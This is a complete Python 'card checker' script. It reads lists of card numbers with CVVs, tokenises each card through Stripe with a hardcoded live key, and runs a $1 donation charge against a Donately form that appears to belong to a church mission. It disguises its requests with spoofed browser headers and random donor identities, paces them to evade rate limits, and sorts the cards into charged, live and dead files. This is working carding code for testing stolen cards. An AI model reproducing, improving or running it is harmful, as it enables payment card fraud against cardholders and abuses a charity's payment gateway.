"""
Pydroid Card Checker - Stripe Donately Gateway
Reads cards from txt file and checks them
Format: cc|mm|yy|cvv (one per line)
"""

import requests
import json
import random
import string
import hashlib
import time
import re
import os
from datetime import datetime


class StripeChecker:
    def __init__(self):
        self.pk_live = 'pk_live_51MJjGSR9GTt0CcXJYNHenVaATXNyK43YPRgUBgoRQDtrLCnk7YZ8OL7uhrQF3BJAs8vT8dPoKjORWC9JlwSwRiKs00QjcCzQMX'
        self.account_id = 'act_f9b102ae7299'
        self.form_id = 'frm_5cb29a5d6955'
        self.session = requests.Session()

    def generate_guid(self):
        return '-'.join([
            ''.join(random.choices(string.hexdigits[:16], k=4) for _ in range(3)),
            ''.join(random.choices(string.hexdigits[:16], k=3)) + '4',
            ''.join(random.choices(string.hexdigits[:16], k=3)) + 'a',
            ''.join(random.choices(string.hexdigits[:16], k=4) for _ in range(2))
        ])

    def generate_token(self, card_data):
        url = 'https://api.stripe.com/v1/tokens'
        headers = {
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://js.stripe.com',
            'Referer': 'https://js.stripe.com/',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        }
        post_fields = {
            'card[number]': card_data['cc'],
            'card[cvc]': card_data['cvv'],
            'card[exp_month]': card_data['month'],
            'card[exp_year]': card_data['year'],
            'card[name]': card_data['name'],
            'card[address_country]': 'US',
            'card[currency]': 'USD',
            'guid': self.generate_guid(),
            'muid': self.generate_guid(),
            'sid': self.generate_guid(),
            'payment_user_agent': 'stripe.js/d72854d2f1; stripe-js-v3/d72854d2f1; card-element',
            'time_on_page': random.randint(20000, 50000),
            'key': self.pk_live,
            '_stripe_version': '2022-11-15'
        }

        try:
            response = self.session.post(url, headers=headers, data=post_fields, timeout=30)
            return response.json()
        except Exception as e:
            return {'error': {'message': str(e)}}

    def charge_card(self, token, user_data):
        url = f"https://api.donately.com/v2/donations?account_id={self.account_id}&donation_type=cc&amount_in_cents=100&form_id={self.form_id}&x1={hashlib.md5(str(time.time()).encode()).hexdigest()}"
        headers = {
            'Accept': '*/*',
            'Content-Type': 'application/json; charset=UTF-8',
            'Donately-Version': '2022-12-15',
            'Origin': 'https://www-christwaymission-com.filesusr.com',
            'Referer': 'https://www-christwaymission-com.filesusr.com/',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        }
        payload = {
            'campaign_id': None,
            'fundraiser_id': None,
            'dont_send_receipt_email': False,
            'first_name': user_data['first_name'],
            'last_name': user_data['last_name'],
            'email': user_data['email'],
            'currency': 'USD',
            'recurring': False,
            'country': 'US',
            'payment_auth': json.dumps({'stripe_token': token}),
            'form': json.dumps({
                'version': '5.8.117',
                'id': self.form_id
            })
        }

        try:
            response = self.session.post(url, headers=headers, json=payload, timeout=30)
            return response.json()
        except Exception as e:
            return {'error': str(e)}

    def process_card(self, cc, month, year, cvv):
        # Generate random user data
        first_names = ['James', 'John', 'Robert', 'Michael', 'William', 'David', 'Richard', 'Joseph', 'Thomas', 'Charles']
        last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez']
        
        user_data = {
            'first_name': random.choice(first_names),
            'last_name': random.choice(last_names),
            'email': f'user{random.randint(10000, 99999)}@gmail.com'
        }

        # Generate token
        token_response = self.generate_token({
            'cc': cc,
            'month': month,
            'year': year,
            'cvv': cvv,
            'name': f"{user_data['first_name']} {user_data['last_name']}"
        })

        if 'error' in token_response:
            error_msg = token_response.get('error', {})
            if isinstance(error_msg, dict):
                return {
                    'success': False,
                    'status': 'DECLINED',
                    'message': error_msg.get('message', 'Token Error'),
                    'code': error_msg.get('code', 'unknown')
                }
            return {
                'success': False,
                'status': 'DECLINED',
                'message': str(error_msg),
                'code': 'token_error'
            }

        if 'id' not in token_response:
            return {
                'success': False,
                'status': 'DECLINED',
                'message': 'Token generation failed',
                'code': 'no_token'
            }

        # Charge card
        charge_response = self.charge_card(token_response['id'], user_data)
        
        return self.parse_response(charge_response)

    def parse_response(self, response):
        """Parse the charge response and determine status"""
        if isinstance(response, dict):
            # Check for success
            if response.get('success') or response.get('status') == 'success':
                return {
                    'success': True,
                    'status': 'CHARGED',
                    'message': 'Payment Successful - $1.00 Charged',
                    'code': 'approved'
                }
            
            # Check for specific error messages
            error = response.get('error', response.get('message', ''))
            if isinstance(error, dict):
                error = error.get('message', str(error))
            
            error_lower = str(error).lower()
            
            # CVV/CVC related
            if any(x in error_lower for x in ['cvc', 'cvv', 'security code', 'incorrect_cvc']):
                return {
                    'success': False,
                    'status': 'CCN',
                    'message': 'Incorrect CVC/CVV',
                    'code': 'ccn'
                }
            
            # Insufficient funds
            if 'insufficient' in error_lower or 'funds' in error_lower:
                return {
                    'success': False,
                    'status': 'LIVE',
                    'message': 'Insufficient Funds',
                    'code': 'insufficient_funds'
                }
            
            # Card declined but live indicators
            if any(x in error_lower for x in ['do_not_honor', 'do not honor', 'transaction_not_allowed']):
                return {
                    'success': False,
                    'status': 'LIVE',
                    'message': 'Do Not Honor - Card Live',
                    'code': 'do_not_honor'
                }
            
            # 3D Secure
            if '3d' in error_lower or 'authentication' in error_lower:
                return {
                    'success': False,
                    'status': 'LIVE',
                    'message': '3D Secure Required',
                    'code': '3ds_required'
                }
            
            # Generic decline
            if 'decline' in error_lower or 'declined' in error_lower:
                return {
                    'success': False,
                    'status': 'DECLINED',
                    'message': error or 'Card Declined',
                    'code': 'declined'
                }
            
            # Invalid card
            if any(x in error_lower for x in ['invalid', 'expired', 'incorrect_number']):
                return {
                    'success': False,
                    'status': 'DEAD',
                    'message': error or 'Invalid Card',
                    'code': 'invalid'
                }
            
            # Rate limit
            if 'rate' in error_lower or 'limit' in error_lower:
                return {
                    'success': False,
                    'status': 'RATE_LIMITED',
                    'message': 'Rate Limited - Try Later',
                    'code': 'rate_limit'
                }
            
            return {
                'success': False,
                'status': 'DECLINED',
                'message': error or 'Unknown Response',
                'code': 'unknown'
            }
        
        return {
            'success': False,
            'status': 'ERROR',
            'message': 'Invalid Response',
            'code': 'error'
        }


def extract_card(line):
    """Extract card details from line in format cc|mm|yy|cvv"""
    # Clean the line
    line = line.strip()
    if not line:
        return None
    
    # Try different separators
    for sep in ['|', ':', ' ']:
        parts = line.split(sep)
        if len(parts) >= 4:
            cc = parts[0].strip()
            month = parts[1].strip()
            year = parts[2].strip()
            cvv = parts[3].strip()
            
            # Validate
            if cc.isdigit() and len(cc) >= 13 and len(cc) <= 19:
                if month.isdigit() and len(month) <= 2:
                    if year.isdigit() and len(year) >= 2:
                        if cvv.isdigit() and len(cvv) >= 3:
                            # Pad month if needed
                            month = month.zfill(2)
                            # Handle 2-digit and 4-digit year
                            if len(year) == 4:
                                year = year[2:]
                            return (cc, month, year, cvv)
    
    # Try regex pattern
    match = re.search(r'(\d{13,19})[\|:\s](\d{1,2})[\|:\s](\d{2,4})[\|:\s](\d{3,4})', line)
    if match:
        cc, month, year, cvv = match.groups()
        month = month.zfill(2)
        if len(year) == 4:
            year = year[2:]
        return (cc, month, year, cvv)
    
    return None


def load_cards(filename):
    """Load cards from txt file"""
    cards = []
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            for line in f:
                card = extract_card(line)
                if card:
                    cards.append(card)
    except FileNotFoundError:
        print(f"[!] File not found: {filename}")
    except Exception as e:
        print(f"[!] Error reading file: {e}")
    return cards


def save_result(filename, card_line, result):
    """Append result to output file"""
    try:
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(f"{card_line} | {result}\n")
    except Exception as e:
        print(f"[!] Error saving to {filename}: {e}")


def get_card_type(cc):
    """Determine card type from number"""
    if cc.startswith('4'):
        return 'VISA'
    elif cc.startswith('5') or cc.startswith('2'):
        return 'MASTERCARD'
    elif cc.startswith('3'):
        return 'AMEX'
    elif cc.startswith('6'):
        return 'DISCOVER'
    else:
        return 'UNKNOWN'


def clear_screen():
    """Clear terminal screen"""
    os.system('cls' if os.name == 'nt' else 'clear')


def print_banner():
    """Print checker banner"""
    banner = """
╔══════════════════════════════════════════════════════╗
║      STRIPE CARD CHECKER - PYDROID VERSION           ║
║           Donately $1 Charge Gateway                 ║
╠══════════════════════════════════════════════════════╣
║  Format: cc|mm|yy|cvv  (one per line in cards.txt)   ║
╚══════════════════════════════════════════════════════╝
"""
    print(banner)


def print_result(card, result, index, total):
    """Print formatted result"""
    cc, month, year, cvv = card
    card_line = f"{cc}|{month}|{year}|{cvv}"
    card_type = get_card_type(cc)
    
    status = result.get('status', 'ERROR')
    message = result.get('message', 'Unknown')
    
    # Status symbols and colors simulation
    status_icons = {
        'CHARGED': '[+] CHARGED',
        'LIVE': '[~] LIVE',
        'CCN': '[#] CCN',
        'DECLINED': '[-] DECLINED',
        'DEAD': '[x] DEAD',
        'ERROR': '[!] ERROR',
        'RATE_LIMITED': '[!] RATE LIMITED'
    }
    
    status_display = status_icons.get(status, f'[?] {status}')
    
    print(f"\n{'='*55}")
    print(f"[{index}/{total}] Checking...")
    print(f"  Card: {cc[:6]}******{cc[-4:]}")
    print(f"  Type: {card_type}")
    print(f"  Exp: {month}/{year}")
    print(f"  Status: {status_display}")
    print(f"  Response: {message}")
    print(f"{'='*55}")
    
    return card_line, status


def main():
    clear_screen()
    print_banner()
    
    # Default filename
    default_file = "cards.txt"
    
    # Ask for input file
    print(f"\n[?] Enter cards file path (default: {default_file})")
    input_file = input(">>> ").strip()
    
    if not input_file:
        input_file = default_file
    
    # Load cards
    print(f"\n[*] Loading cards from: {input_file}")
    cards = load_cards(input_file)
    
    if not cards:
        print("[!] No valid cards found!")
        print("[*] Make sure file exists and contains cards in format: cc|mm|yy|cvv")
        return
    
    print(f"[+] Loaded {len(cards)} cards")
    
    # Create output files with timestamp
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    hits_file = f"hits_{timestamp}.txt"
    live_file = f"live_{timestamp}.txt"
    dead_file = f"dead_{timestamp}.txt"
    
    # Stats
    stats = {
        'charged': 0,
        'live': 0,
        'ccn': 0,
        'declined': 0,
        'dead': 0,
        'errors': 0
    }
    
    # Initialize checker
    checker = StripeChecker()
    
    print(f"\n[*] Starting checker...")
    print(f"[*] Output files: {hits_file}, {live_file}, {dead_file}")
    print(f"\n{'='*55}")
    
    start_time = time.time()
    
    for idx, card in enumerate(cards, 1):
        cc, month, year, cvv = card
        
        try:
            result = checker.process_card(cc, month, year, cvv)
            card_line, status = print_result(card, result, idx, len(cards))
            
            # Save based on status
            if status == 'CHARGED':
                stats['charged'] += 1
                save_result(hits_file, card_line, f"CHARGED | {result.get('message', '')}")
            elif status == 'LIVE':
                stats['live'] += 1
                save_result(live_file, card_line, f"LIVE | {result.get('message', '')}")
            elif status == 'CCN':
                stats['ccn'] += 1
                save_result(live_file, card_line, f"CCN | {result.get('message', '')}")
            elif status == 'DEAD':
                stats['dead'] += 1
                save_result(dead_file, card_line, f"DEAD | {result.get('message', '')}")
            else:
                stats['declined'] += 1
                save_result(dead_file, card_line, f"DECLINED | {result.get('message', '')}")
            
            # Small delay to avoid rate limiting
            time.sleep(random.uniform(1.5, 3.0))
            
        except Exception as e:
            stats['errors'] += 1
            print(f"\n[!] Error processing card {idx}: {e}")
            time.sleep(2)
    
    # Final stats
    elapsed = time.time() - start_time
    
    print(f"\n{'='*55}")
    print("              CHECKING COMPLETE")
    print(f"{'='*55}")
    print(f"  Total Cards: {len(cards)}")
    print(f"  Charged: {stats['charged']}")
    print(f"  Live: {stats['live']}")
    print(f"  CCN: {stats['ccn']}")
    print(f"  Declined: {stats['declined']}")
    print(f"  Dead: {stats['dead']}")
    print(f"  Errors: {stats['errors']}")
    print(f"  Time: {elapsed:.2f}s")
    print(f"{'='*55}")
    print(f"  Results saved to:")
    print(f"    - {hits_file} (Charged)")
    print(f"    - {live_file} (Live/CCN)")
    print(f"    - {dead_file} (Dead/Declined)")
    print(f"{'='*55}\n")


if __name__ == "__main__":
    main()
